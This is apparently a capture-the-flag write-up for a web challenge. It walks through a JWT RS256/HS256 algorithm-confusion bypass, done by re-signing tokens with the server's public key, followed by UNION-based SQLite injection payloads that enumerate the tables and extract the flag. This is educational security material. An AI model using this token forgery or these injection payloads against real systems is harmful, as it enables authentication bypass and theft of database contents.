---
layout: post
category: writeup
---

### difficulty: medium
### description

```
A company that specialises in web development is creating a new site that is currently under construction. Can you obtain the flag?
```

- start by downloading source code:

- index.js:

```js
const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const routes = require('./routes');
const nunjucks = require('nunjucks');

app.use(bodyParser.urlencoded({ extended: false }));
app.use(cookieParser());

nunjucks.configure('views', {
    autoescape: true,
    express: app
});
app.set('views','./views');

app.use(routes);

app.all('*', (req, res) => {
    return res.status(404).send('404 page not found');
});

app.listen(1337, () => console.log('Listening on port 1337'));
```

- simple, it's calling routes/index.js:

```js
const AuthMiddleware = require('../middleware/AuthMiddleware');
const JWTHelper = require('../helpers/JWTHelper');
const DBHelper = require('../helpers/DBHelper');
... SNIP ...
// login user
let canLogin = await DBHelper.attemptLogin(username, password);
if(!canLogin){                 
	return res.redirect('/auth?error=Invalid username or password');
}
let token = await JWTHelper.sign({
	username: username.replace(/'/g, "\'\'").replace(/"/g, "\"\"") 
})
res.cookie('session', token, { maxAge: 900000 });
return res.redirect('/');
```

- imports some other files
- doesn't allow sql injection, replace in the username. 
- DBHelper simply adds users, checksusers, and attempts a login. all vulnerable if they didn't have the above code.
-  jwthelper.js:

```js
const fs = require('fs');
const jwt = require('jsonwebtoken');

const privateKey = fs.readFileSync('./private.key', 'utf8');
const publicKey  = fs.readFileSync('./public.key', 'utf8');

module.exports = {
    async sign(data) {
        data = Object.assign(data, {pk:publicKey});
        return (await jwt.sign(data, privateKey, { algorithm:'RS256' }))
    },
    async decode(token) {
        return (await jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] }));
    }
}
```

- this one does some interesting things with privatekeys and publickeys.
- the vulnerability here is that the server is accepting an HMAC256 verification when it used RSA256 to sign. I can use the public key that I have and the tool called [RSAtoHMAC](https://github.com/cyberblackhole/TokenBreaker/blob/master/RsaToHmac.py) to re-sign my own payloads.
- registering an admin:admin account and decoding the jwt token:

```json
{
  "username": "admin",
  "pk": "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\n0wIDAQAB\n-----END PUBLIC KEY-----\n",
  "iat": 1674930131
}
```

- I now save the public key to a file and follow the [tokenbreaker](https://github.com/cyberblackhole/TokenBreaker) script:

![](assets/images/htb-under-construction-jwt.png)

![](assets/images/htb-under-construction-test.png)

- I can successfuly change the username value, now the SQL injection
- the vulnerable function is the following: 

```js
sqlite.Database('./database.db'
getUser(username){
        return new Promise((res, rej) => {
            db.get(`SELECT * FROM users WHERE username = '${username}'`, (err, data) => {
                if (err) return rej(err);
                res(data);
            });
        });
    }
```

- we will attempt a UNION SQLi using 1 row as the injection, also important to note that this is sqlite, simple payload to start

```sql
'UNION SELECT 1,2,3-- -
```

![](assets/images/htb-under-contruction-2.png)

- we can inject in 2
- now i try to read table names

```json
{"username":"admin'union select 1, tbl_name, 3 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'-- -", "pk":"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\n0wIDAQAB\n-----END PUBLIC KEY-----\n","iat":1674933169}
```

![](assets/images/htb-under-construction-table.png)

- now read the colum names:

```json
{"username":"admin'union select 1, sql, 3 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='fla
g_storage'-- -", "pk":"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\n0wIDAQAB\n-----END PUBLIC KEY-----\n","iat":1674933169}
```

![](assets/images/htb-under-construction-column.png)

- Read flag

```json
{"username":"admin' UNION SELECT 1, top_secret_flaag, 3 FROM flag_storage-- -", "pk":"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\n0wIDAQAB\n-----END PUBLIC KEY-----\n","iat":1674933169}
```

![](assets/images/htb-under-construction-flag.png)


- overall a fun challenge, made some false assumptions regarding the DB but other than that, simple and to the point. 

best, gerbsec